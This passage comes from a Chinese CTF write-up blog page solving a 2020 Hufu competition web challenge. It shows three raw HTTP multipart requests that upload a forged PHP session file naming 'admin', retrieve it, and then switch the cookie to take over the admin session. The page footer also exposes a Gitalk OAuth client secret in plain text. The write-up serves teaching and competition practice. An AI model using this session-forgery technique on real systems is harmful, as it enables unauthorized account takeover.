+<img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200420162317571.png" alt="image-20200420162317571" style="zoom:200%;">
+
+<p>然后直接计算hash值</p>
+<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200420162432734.png" alt="image-20200420162432734"></p>
+</blockquote>
+<p>然后向服务器端上传文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: 6a26ba086a9d4a20a30b6f98d683123677f302903f364ff8.changame.ichunqiu.com</span><br><span class="line">Content-Length: 318</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Origin: http:&#x2F;&#x2F;e663f4c6b5e24170b6528d6d8b672a197f04b6d3d4ce4f7e.changame.ichunqiu.com</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.149 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.35.158&#x2F;hf&#x2F;upload.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7,zh-TW;q&#x3D;0.6</span><br><span class="line">Cookie: PHPSESSID&#x3D;gijbgl5915bkhhlu6ldn446u3l</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;direction&quot;</span><br><span class="line"></span><br><span class="line">upload</span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;up_file&quot;; filename&#x3D;&quot;sess&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">usernames:5:&quot;admin&quot;;</span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0--</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419165744260.png" alt="image-20200419165744260"></p>
+<p>可以检测一下文件是否上传成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 6a26ba086a9d4a20a30b6f98d683123677f302903f364ff8.changame.ichunqiu.com</span><br><span class="line">Content-Length: 312</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Origin: http:&#x2F;&#x2F;e663f4c6b5e24170b6528d6d8b672a197f04b6d3d4ce4f7e.changame.ichunqiu.com</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.149 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7,zh-TW;q&#x3D;0.6</span><br><span class="line">Cookie: PHPSESSID&#x3D;gijbgl5915bkhhlu6ldn446u3l</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;direction&quot;</span><br><span class="line"></span><br><span class="line">download</span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;filename&quot;</span><br><span class="line"></span><br><span class="line">sess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0--</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419170141101.png" alt="image-20200419170141101"></p>
+<p>之后通过attr建立success.txt文件夹，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: 6a26ba086a9d4a20a30b6f98d683123677f302903f364ff8.changame.ichunqiu.com</span><br><span class="line">Content-Length: 420</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Origin: http:&#x2F;&#x2F;e663f4c6b5e24170b6528d6d8b672a197f04b6d3d4ce4f7e.changame.ichunqiu.com</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.149 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.35.158&#x2F;hf&#x2F;upload.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7,zh-TW;q&#x3D;0.6</span><br><span class="line">Cookie: PHPSESSID&#x3D;gijbgl5915bkhhlu6ldn446u3l</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;direction&quot;</span><br><span class="line"></span><br><span class="line">upload</span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;attr&quot;</span><br><span class="line"></span><br><span class="line">success.txt</span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;up_file&quot;; filename&#x3D;&quot;sess&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">usernames:5:&quot;admin&quot;;</span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0--</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419165832078.png" alt="image-20200419165832078"></p>
+<p>然后修改cookie，刷新界面。</p>
+<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419165937895.png" alt="image-20200419165937895"></p>
+
+      
+    </div>
+  </div>
+  <!-- 要添加的内容 -->
+  
+    <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>作者:  </strong>Mount4in</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>文章链接:  </strong>
+          <a href="/2020/04/19/2020数字中国创新大道虎符网络安全赛道Web题解/" target="_blank" title="2020数字中国创新大道虎符网络安全赛道Web题解">http://mount4in.github.io/2020/04/19/2020数字中国创新大道虎符网络安全赛道Web题解/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>版权声明:   </strong>
+            本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            许可协议。转载请注明出处!
+          </li>
+        </ul>
+      <div>
+
+  
+  <!---->
+    <footer class="article-footer">
+      <a data-url="http://mount4in.github.io/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/" data-id="clg20p606002e14uvald16mva"
+         class="article-share-link">Share</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+
+    </footer>
+
+
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2020/04/22/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0cbc-padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            从一道ctf题学习cbc-padding-oracle和cbc翻转
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/04/17/shellcoderop/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">长亭公开课——Shellcode&amp;ROP</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: 'b7d32ae2538e1a71f462',
+      clientSecret: 'da0452b610458a4ccbc38598fb0d02f0eb9e653d',
+      repo: 'gitalk',
+      owner: 'Mount4in',
+      admin: ['Mount4in'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2023 Mount4in</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="Mount4in"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
